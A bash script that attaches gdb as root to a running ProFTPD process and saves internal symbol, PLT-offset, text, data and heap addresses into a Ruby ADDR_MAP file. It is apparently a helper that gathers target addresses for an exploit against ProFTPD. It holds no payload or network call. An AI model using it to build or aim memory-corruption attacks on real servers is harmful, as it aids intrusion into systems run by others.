#!/bin/bash


source config

GDB_SCRIPT=$(mktemp)
TMPFILE=$(mktemp)
ADDRFILE="addr_map.rb"

[[ "$EUID" -ne 0 ]] && fail "Please run as root"
[[ -z "${PROCESS}" ]] && fail "Cannot find proftpd, is it running?"

[[ -n "${VERBOSE}" ]] && set -x

TMPFILE="raw_${ADDRFILE}"
rm -f ${TMPFILE}
echo "start" > ${TMPFILE}

say "creating addr_map script in ${GDB_SCRIPT}"
cat <<EOF | tee ${GDB_SCRIPT} > /dev/null
set logging file ${TMPFILE}
set pagination off
set logging on
set logging redirect on
p &ssl_ctx
p &session.total_bytes_out
p &auth_unix_module
x/xw &auth_unix_module
x/xw \$_+0x4
p &main_server
p &data_start
p &resp_buf
i proc m
info address mons.8644
info address open64@plt
quit
EOF

say "executing: gdb -p ${PROCESS} -x ${GDB_SCRIPT}"
if [[ -n "${VERBOSE}" ]]; then
	gdb -p ${PROCESS} -x ${GDB_SCRIPT}
else
	gdb -p ${PROCESS} -x ${GDB_SCRIPT} > /dev/null
fi

say "parsing log at ${TMPFILE}, storing bytemap to ${ADDRFILE}"
cp -f "${ADDRFILE}" "${ADDRFILE}.bak" 2> /dev/null
echo "ADDR_MAP = {" > ${ADDRFILE}
cat ${TMPFILE} | perl -n  -e "
	\$d = 0;
	%found = ();
	\$first = 0;
	while (<>) {
		if (m/^.1\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|SSL_CTX|} = \$1;
		} elsif (m/^.2\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|SESSION_TOTAL_BYTES_OUT|} = \$1;
		} elsif (m/^.3\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|G_PTR_ADDR|} = \$1;
		} elsif (m/^0x0*(\w+)\s+<auth_unix_module\+16>:\s+0x0*(\w*).*/x) {
			\$found{q|G_PTR_ADDR|} = \$1;
			\$found{q|G_PTR|} = \$2;
		} elsif (m/^.4\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|MAIN_SERVER_ADDR|} = \$1;
		} elsif (m/^.5\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|DATA_START|} = sprintf(q|%x|, hex(\$1) - 15);
		} elsif (m/^.6\s+=\s+\(.*\)\s+0x(\w*).*/x) {
			\$found{q|RESP_BUF|} = \$1;
		} elsif (m/^\s*Symbol\s+.mons.8644.\s+is\s+at\s+0x(\w*).*/x) {
			\$found{q|MONS_ADDR|} = \$1;
		} elsif (m/^\s*Symbol\s+.open64.plt.\s+is\s+at\s+0x(\w*).*/x) {
			\$found{q|EMPTY|} = sprintf(q|%x|, 9 + hex \$1);
			\$found{q|NON_EMPTY|} =  sprintf(q|%x|, 14 + hex \$1);
		} elsif (m|^\s*0x(\w+)\s+0x\w+\s+0x\w+\s+0x\w+\s+/usr/local/proftpd.+proftpd\s*\$|) {
			if (\$first == 0) {
				\$found{q|ADDR_TEXT|} = \$1;
			} elsif (\$first == 1) {
				\$found{q|ADDR_DATA|} = \$1;
			}
			\$first = (\$first + 1) % 3;
		} elsif (m|^\s*0x(\w+)\s+0x\w+\s+0x\w+\s+\w+\s+\\[heap\]\s*\$|) {
			if (\$first == 0) {
				\$found{q|ADDR_HEAP|} = \$1;
			}
			\$first = (\$first + 1) % 3;
		}
	}
	die q|failed to find all addresses| unless
			(\$found{q|ADDR_DATA|} and
			\$found{q|ADDR_TEXT|} and
			\$found{q|G_PTR|} and
			\$found{q|G_PTR_ADDR|} and
			\$found{q|MAIN_SERVER_ADDR|} and
			\$found{q|SESSION_TOTAL_BYTES_OUT|} and
			\$found{q|SSL_CTX|} and
			\$found{q|DATA_START|} and
			\$found{q|RESP_BUF|} and
			\$found{q|MONS_ADDR|} and
			\$found{q|EMPTY|} and
			\$found{q|NON_EMPTY|} and
			\$found{q|ADDR_HEAP|});

	for (sort keys %found) {
		printf qq|\"%s\" => 0x%s,\n|, \$_, \$found{\$_};
	}" \
	>> ${ADDRFILE}
echo "}" >> ${ADDRFILE}

diff "${ADDRFILE}" "${ADDRFILE}.bak"

say "cleaning up"
rm ${GDB_SCRIPT}
# rm ${TMPFILE}
